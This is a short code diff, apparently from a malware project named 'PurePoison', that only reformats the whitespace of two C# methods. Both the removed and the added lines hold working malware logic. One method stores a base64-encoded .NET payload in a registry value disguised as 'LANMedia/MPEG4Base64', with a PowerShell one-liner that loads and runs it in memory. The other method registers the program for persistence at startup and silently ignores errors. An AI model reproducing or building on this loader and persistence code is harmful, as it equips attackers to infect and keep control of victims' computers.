@@ -25,20 +25,20 @@ namespace PurePoison
 		
 		
 		public static void Install(string payload)
-        {
-            Registry.CurrentUser.CreateSubKey("LANMedia").SetValue("MPEG4Base64", string.Format("([System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"{0}\"))).EntryPoint.Invoke($null,$null)", payload));
-        }
+		{
+		    Registry.CurrentUser.CreateSubKey("LANMedia").SetValue("MPEG4Base64", string.Format("([System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"{0}\"))).EntryPoint.Invoke($null,$null)", payload));
+		}
 		
 		public static void StartUP()
-        {
-            try
-            {
-                Registry.CurrentUser.CreateSubKey(REG_PATH).SetValue("PurePoison", REG_RUNNER);
-            }
-            catch
-            {
-            }
-        }
+		{
+		    try
+		    {
+			Registry.CurrentUser.CreateSubKey(REG_PATH).SetValue("PurePoison", REG_RUNNER);
+		    }
+		    catch
+		    {
+		    }
+		}
 		
 		
 		public static string Download()
